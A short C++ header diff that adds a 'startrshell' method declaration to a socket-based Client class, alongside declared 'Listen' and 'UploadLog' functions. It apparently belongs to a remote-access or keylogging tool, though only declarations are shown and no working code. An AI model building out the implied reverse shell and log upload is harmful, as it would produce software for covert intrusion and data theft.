@@ -17,7 +17,8 @@ class Client
 		Client(void);
 		~Client(void);
 		SOCKET connectSocket;
-		int iResult;  
+		int iResult; 
+		void startrshell();
 };
 void Listen(SOCKET csock);
 void UploadLog(SOCKET csock);
